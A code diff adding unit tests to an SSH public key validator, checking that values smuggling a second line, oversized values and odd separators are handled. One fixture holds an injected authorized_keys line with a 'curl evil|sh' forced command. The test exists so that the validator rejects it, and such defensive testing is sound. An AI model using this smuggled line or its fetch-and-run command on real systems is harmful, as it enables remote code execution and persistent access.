@@ -33,6 +33,33 @@ describe("sshPublicKey", () => {
     }
   });
 
+  // Security review 2026-09-10: `\s` matched a newline, so a comment-less
+  // key followed by a second line was accepted whole — and the second line is
+  // what would land in authorized_keys. Any line break, anywhere, is a reject.
+  it("rejects a value that carries a second line, however it is joined", () => {
+    const body = "AAAAC3NzaC1lZDI1NTE5AAAAIGb8Q7wq1p3E7c9rZk4x2sY6Hk6s";
+    const evil = 'command="curl evil|sh" ssh-ed25519 AAAAattacker';
+    for (const d of [
+      `ssh-ed25519 ${body}\n${evil}`,
+      `ssh-ed25519 ${body}\r\n${evil}`,
+      `ssh-ed25519 ${body} user@host\n${evil}`,
+      `ssh-ed25519 ${body} user\nhost`,
+      `ssh-ed25519\n${body}`,
+    ]) {
+      expect(sshPublicKey([{ name: "ssh", ready: true, details: [d] }])).toBe("");
+    }
+  });
+
+  it("rejects an implausibly long value", () => {
+    const huge = `ssh-rsa ${"A".repeat(5000)}`;
+    expect(sshPublicKey([{ name: "ssh", ready: true, details: [huge] }])).toBe("");
+  });
+
+  it("still accepts a comment with inner spaces and a tab separator", () => {
+    const k = "ssh-ed25519\tAAAAC3NzaC1lZDI1NTE5AAAAIGb8Q7wq1p3E7c9rZk4x2sY6Hk6s my laptop key";
+    expect(sshPublicKey([{ name: "ssh", ready: true, details: [k] }])).toBe(k);
+  });
+
   it("returns nothing without the ssh tool, without details, or without tools", () => {
     expect(sshPublicKey(undefined)).toBe("");
     expect(sshPublicKey([])).toBe("");
